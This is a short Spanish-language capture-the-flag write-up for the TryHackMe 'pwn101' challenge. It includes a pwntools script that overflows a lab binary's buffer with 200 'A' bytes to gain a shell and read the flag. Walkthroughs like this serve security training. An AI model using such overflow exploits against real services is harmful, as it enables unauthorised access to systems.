# Enunciado
![Imagen01](01.png)
# Resolución

Al ejecutar el binario vemos que con una entrada grande ya se desborda y nos da una shell.
![](02.png)

Por lo que escribimos directamente el código.

![](03.png)


~~~
from pwn import *
p = remote('10.10.6.214',9001)

payload = b'A'*200
p.recv()
p.sendline(payload)
p.interactive()
~~~
Lo ejecutamos y podemos acceder a la flag.

![](04.png)

 
**Autor:** [Andr3sdelRio](https://twitter.com/Andr3sdelRio) 

- [URL original del reto](https://tryhackme.com/room/pwn101) 
 
